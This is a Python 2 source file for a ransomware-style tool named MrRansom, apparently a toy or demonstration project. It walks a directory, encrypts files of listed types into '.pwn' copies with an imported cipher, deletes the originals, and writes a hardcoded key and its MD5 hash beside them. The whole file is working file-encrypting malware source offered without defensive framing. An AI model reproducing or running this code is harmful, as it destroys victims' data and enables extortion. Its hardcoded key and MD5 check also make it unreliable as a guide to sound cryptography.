import hashlib
import json
import os
import time

from file_util import read_chunks, get_file, write_chunk, put_file, take_file
from aldersonalgorithm import AldersonAlgorithm

ENCRYPT = 'encrypt'

DECRYPT = 'decrypt'

FILE_TYPES_JSON = os.path.join(os.path.dirname(os.path.realpath(__file__)), "file_types.json")

ENCRYPTED_EXTENSION = ".pwn"

KEY_FILE = "ransom.pwnkey"

KEY_HASH_FILE = "ransom.pwnhash"


def get_target_files(files, mode):
    files_to_process = []
    for file_path in files:
        if should_process(file_path, mode):
            files_to_process.append(file_path)

    return files_to_process


def should_process(file_path, mode):
    return mode == ENCRYPT and can_encrypt_file(file_path) \
           or mode == DECRYPT and can_decrypt_file(file_path)


def can_encrypt_file(filename):
    for file_type in encryptable_file_types():
        if filename.endswith(file_type) and not os.path.basename(filename).startswith("."):
            return True


def can_decrypt_file(file_name):
    if file_name.endswith(ENCRYPTED_EXTENSION):
        return True


def encryptable_file_types():
    types_json = json.loads(get_file(FILE_TYPES_JSON))

    return [file_type for file_type in types_json["fileTypes"]]


class MrRansom:

    def __init__(self, root_dir):
        self.root_dir = root_dir
        self.all_files = [os.path.join(root, file_name) for root, directories, file_names in
                          os.walk(root_dir) for file_name in file_names]

    def encrypt(self):
        key = self.create_key()

        self.export_key(self.root_dir, key)

        for file_path in get_target_files(self.all_files, ENCRYPT):
            self.encrypt_file(file_path, AldersonAlgorithm(key))

    def decrypt(self):
        key = self.get_key(self.root_dir)

        for file_path in get_target_files(self.all_files, DECRYPT):
            self.decrypt_file(file_path, AldersonAlgorithm(key))

    def encrypt_file(self, file_path, algorithm):
        start_time = time.time()

        out_file_path = file_path + ENCRYPTED_EXTENSION
        self.process(file_path, out_file_path, algorithm.encrypt_chunk)

        print "Encrypted '{}' in {}s".format(file_path, time.time() - start_time)

    def decrypt_file(self, file_path, algorithm):
        start_time = time.time()

        out_file_path = file_path[:len(file_path) - len(ENCRYPTED_EXTENSION)]
        self.process(file_path, out_file_path, algorithm.decrypt_chunk)

        print "Decrypted '{}' in {}s".format(out_file_path, time.time() - start_time)

    @staticmethod
    def process(in_file_path, out_file_path, process):
        in_file = open(in_file_path, "rb")
        out_file = open(out_file_path, "w")

        for chunk in read_chunks(in_file):
            write_chunk(out_file, process(chunk))

        in_file.close()
        out_file.close()

        os.remove(in_file_path)

    @staticmethod
    def create_key():
        return map(ord, "6l72xhpwZ9P3RjTHUi8vuq2hHP0dlaSz")

    @staticmethod
    def get_key(root_dir):
        raw_key = take_file(os.path.join(root_dir, KEY_FILE))
        key_hash = take_file(os.path.join(root_dir, KEY_HASH_FILE))

        hash_md5 = hashlib.md5()
        hash_md5.update(raw_key)

        if hash_md5.hexdigest() != key_hash:
            raise Exception('Key not valid')

        return map(ord, raw_key)

    @staticmethod
    def export_key(root_dir, key):
        key_string = "".join(map(chr, key))
        put_file(os.path.join(root_dir, KEY_FILE), key_string)

        hash_md5 = hashlib.md5()
        hash_md5.update(key_string)
        put_file(os.path.join(root_dir, KEY_HASH_FILE), hash_md5.hexdigest())
